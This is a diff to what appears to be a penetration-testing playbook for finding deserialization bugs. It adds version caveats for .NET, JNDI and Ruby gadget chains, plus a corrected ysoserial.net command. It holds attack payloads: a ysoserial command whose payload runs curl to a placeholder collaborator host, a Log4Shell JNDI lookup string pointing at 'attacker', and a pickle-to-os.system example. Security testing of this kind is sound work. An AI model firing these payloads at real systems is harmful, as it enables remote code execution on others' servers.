@@ -15,8 +15,8 @@ Deserialization bugs are almost always Critical — they lead directly to RCE wi
 - **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
 - **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
 - **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
-- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
-- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
+- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE (.NET Framework, or .NET 9+ only with the unsupported compat package)
+- **Ruby Marshal.load** — version-specific universal gadget chains (Phase 6) → RCE
 - **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
 
 ---
@@ -298,12 +298,16 @@ curl -s https://$TARGET/api/load-model \
 # Check if ViewState is unsigned (MAC disabled)
 # Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC
 
-# YSoSerial.Net
-dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
+# .NET 9+: the in-box BinaryFormatter always throws PlatformNotSupportedException, so this sink exists only on
+# .NET Framework or where the app ships the unsupported System.Runtime.Serialization.Formatters compat package.
+# Fingerprint the runtime first (https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/).
+# ysoserial.net is a .NET Framework exe: run ysoserial.exe on Windows, or under mono elsewhere (not `dotnet`).
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
   -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
 ```
 
 ### Phase 5 — Log4Shell / JNDI
+JDK caveat: remote class loading through JNDI is off by default since 8u121 for RMI/CORBA (`trustURLCodebase=false`) and since 8u191 for LDAP (per Veracode; CVE-2018-3149). On those JDKs a callback proves the lookup happened, but RCE needs a factory or gadget already on the target's classpath (the documented case is Tomcat `BeanFactory`, whose `forceString` route was removed in Tomcat 9.0.63 / 8.5.79 / 10.0.21 / 10.1.0-M14). Report the lookup; do not assume the class load.
 ```bash
 # Test all user-controlled inputs
 COLLAB="COLLAB_HOST"
@@ -321,10 +325,12 @@ curl -s -X POST https://$TARGET/api/login \
 ```bash
 # Look for Marshal.load in source
 grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
-
-# Gem::Requirement gadget chain via marshalable objects
-# Use ruby-advisory-db gadgets
 ```
+Ruby "universal" chains live in RubyGems/stdlib classes and break between releases, so record `RUBY_VERSION` and the RubyGems version (error pages, `Gemfile.lock`, image tags) before picking one. Rung 1 for Ruby stays static evidence (see the ladder); every chain below is **Stage B**.
+- **Ruby 3.4 universal chain** — Luke Jahnke, <https://nastystereo.com/security/ruby-3.4-deserialization.html> (2024-11-24). Worked up to the 3.4 release candidates; RubyGems hardening killed it in **Ruby 3.4.0**.
+- **Ruby 4.0 universal chain** — elttam (Luke Jahnke, 2026-08-14), <https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain>: one `Marshal.load` → RCE on Ruby 4.0.6, unchanged back to 3.3. The current default assumption for an unpatched Ruby target.
+- **`GitHubSecurityLab/ruby-unsafe-deserialization`** — PoCs for `Marshal`, Psych (YAML), Oj and Ox, each with a callback-only detection chain and an RCE chain; README coverage stops at Ruby 3.2.4 (Marshal) / 3.3.3 (others). The detection chain still drives a gadget chain, so it is Stage B here too.
+`ruby-advisory-db` is a CVE database for `bundler-audit`, not a gadget source: use it to version-check gems, not to build payloads.
 
 ### Phase 6b — Ruby beyond Marshal: YAML defaults, class pollution, `_json` juggling
 
@@ -472,6 +478,7 @@ A confirmed sink with execution never attempted is still Critical. Say which run
 |---|---|
 | `hunt-aspnet` | Owns ViewState and `machineKey`. Phase 4 here is the sink; the key recovery, `__VIEWSTATEGENERATOR` handling and ysoserial.net ViewState plugin flags live there. |
 | `hunt-laravel` | Owns `.env` / `APP_KEY` discovery and classic encrypted-cookie forging. Phase 2b here owns Livewire hydration mechanics. |
+| `hunt-nextjs` | React2Shell (CVE-2025-55182) is an RSC Flight deserialization sink: pre-auth RCE in `react-server-dom-*` 19.0.0 / 19.1.0 / 19.1.1 / 19.2.0 behind Next.js App Router Server Functions. Detection and version gates live there. |
 | `hunt-rce` | Owns SnakeYAML, Ruby `rdoc_options` YAML and SpEL. Come here when the entry point is a serialized blob rather than a command string. |
 | `hunt-file-upload` | The front door for Phase 7. A model-file upload is both an upload bug and a deserialization sink. |
 | `hunt-llm-ai`, `hunt-rag-vector` | AI-pipeline framing, supply chain of pulled models, and OOB proof for AI features. Model-file deserialization mechanics stay in Phase 7. |
